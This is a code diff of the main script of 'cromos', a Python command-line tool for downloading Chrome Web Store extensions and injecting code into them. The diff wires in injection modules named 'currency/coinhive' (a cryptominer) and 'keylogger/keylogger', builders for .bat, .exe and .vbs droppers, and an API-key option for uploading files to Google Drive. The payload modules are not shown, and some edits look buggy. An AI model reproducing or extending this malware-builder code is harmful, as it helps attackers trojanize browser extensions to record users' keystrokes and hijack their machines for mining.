@@ -2,13 +2,10 @@
 
 import argparse
 import sys
-import libs.crx
-from libs.crx import Cromos
+from libs.download import Download
 from libs.drive import Drive
 from libs.build import Build
-from libs.loader import Loader
 from libs.colors import Colors
-from libs.build import Build
 from libs.loader import Loader
 
 
@@ -31,15 +28,15 @@ def main() :
  | (__  |   /  | (_) | | |\/| | | (_) | \__ \  
   \___| |_|_\   \___/  |_|  |_|  \___/  |___/
 	 """
-		print(color.error("{}".format(banner)))
+		print("{}".format(banner))
 		print("  Version: {} Builds: {} Modules: {}\n".format("1.0","3", "2"))
 
 	def help () :
 
-		global extension, build, apikey, module
+		global extension, builds, apikey, modules
 
 		parser = argparse.ArgumentParser(description="Download and Inject code into Google Chrome extensions", usage="python cromos.py --help")
-		parser.add_argument('--extension', help="Download a extension from Google Chrome Webstore", type=str, default="", required=True)
+		parser.add_argument('--extension', help="Download a extension from Google Chrome Webstore", type=str, required="true")
 		parser.add_argument('--load', help='Load a script to run in background with the application', type=str)
 		parser.add_argument('--build', help='Build types .bat\n.exe\n.vbs', type=str)
 		parser.add_argument('--key', help='API key for uploading files in Google Drive', type=str)
@@ -57,12 +54,13 @@ def main() :
 	help()
 	banner()
 
-	cromos = Cromos(extension)
-	
-	if module:
+	download = Download(extension)
+
+	if builds == "bat" or builds == "vbs":
 		builder = Build(extension, builds).builder()
-	elif modules:
-		loader = Loader(extension, module).inject()
+	if modules == "currency/coinhive" or modules == "keylogger/keylogger" :
+		loader = Loader(extension, modules).inject()
+
 if __name__== "__main__" :
 
 	main()
